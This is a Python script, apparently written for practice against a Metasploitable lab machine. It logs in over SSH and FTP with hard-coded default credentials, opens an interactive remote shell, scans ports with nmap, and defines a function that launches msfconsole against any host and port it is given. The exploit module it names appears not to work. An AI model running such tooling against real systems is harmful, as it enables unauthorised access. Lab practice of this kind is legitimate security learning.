import paramiko
from ftplib import FTP
import sys
import nmap
import re
import subprocess   # Used for Metasploitable

# Replace these with your actual credentials
SSH_USERNAME = 'msfadmin'
SSH_PASSWORD = 'msfadmin'
FTP_USERNAME = 'msfadmin'
FTP_PASSWORD = 'msfadmin'

def ssh_connect(metasploitable_ip, port):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        client.connect(metasploitable_ip, username=SSH_USERNAME, password=SSH_PASSWORD, port=port)
        print(f"Successfully connected to {metasploitable_ip} via SSH on port {port}.")
        
        shell = client.invoke_shell()
        while True:
            command = input("Enter command to execute on Metasploitable (or 'exit' to quit): ")
            if command.lower() == 'exit':
                break
            shell.send(command + '\n')
            while shell.recv_ready():
                output = shell.recv(1024).decode('utf-8')
                print(output)
        
        client.close()
    except Exception as e:
        print(f"SSH Connection failed: {e}")

def ftp_connect(metasploitable_ip, port):
    try:
        ftp = FTP()
        ftp.connect(metasploitable_ip, port)
        ftp.login(user=FTP_USERNAME, passwd=FTP_PASSWORD)
        print(f"Successfully connected to {metasploitable_ip} via FTP on port {port}.")
        
        print("Files in the current directory:")
        ftp.retrlines('LIST')
        
        ftp.quit()
    except Exception as e:
        print(f"FTP Connection failed: {e}")

def nmap_scan(ip_address, port_range):
    nm = nmap.PortScanner()
    port_min, port_max = map(int, port_range.split('-'))
    
    print(f"Scanning ports {port_min} to {port_max} on {ip_address}")
    # Store ports for attacking function
    open_ports = []
    for port in range(port_min, port_max + 1):
        try:
            result = nm.scan(ip_address, str(port))
            port_status = result['scan'][ip_address]['tcp'][port]['state']
            print(f"Port {port}: {port_status}")
            # Add open ports to list
            if port_status == 'open':
                open_ports.append(port)
        except:
            print(f"Cannot scan port {port}")
    # Return list of open ports
    return open_ports

# Function to exploit open ports
def attack(host, port):
    # Runs a Metasploit module against the target host and port
    # Generic TCP exploit
    try:
        # This command will launch msfconsole, seleecting the generic TCP exploit module, setting the target host and port, and running the exploit
        msf_command = f"msfconsole -x 'use exploit/generic/tcp; set RHOSTS {host}; set RPORT {port}; exploit'"

        # Execute the command
        process = subprocess.Popen(msf_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()  # Capture the output

        print("Metasploit Output:")
        print(stdout.decode())
        print("Metasploit Errors:")
        print(stderr.decode())

        if process.returncode != 0:
            print(f"Metasploit failed with return code {process.returncode}")
        else:
            print("Metasploit attack completed successfully")

    except FileNotFoundError:
        print("Metasploit is not installed. Please install it and try again.")
    except Exception as e:
        print(f"Metasploit failed with error: {e}")


def main():
    metasploitable_ip = input("Enter the IP address of the target machine: ")
    
    print("Select operation:")
    print("1. SSH Connection")
    print("2. FTP Connection")
    print("3. Nmap Port Scan")
    choice = input("Enter your choice (1/2/3): ")
    
    if choice == '1':
        port = int(input("Enter the SSH port number (default is 22): ") or 22)
        ssh_connect(metasploitable_ip, port)
    elif choice == '2':
        port = int(input("Enter the FTP port number (default is 21): ") or 21)
        ftp_connect(metasploitable_ip, port)
    elif choice == '3':
        port_range = input("Enter the port range to scan (e.g., 20-100): ")
        nmap_scan(metasploitable_ip, port_range)
    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()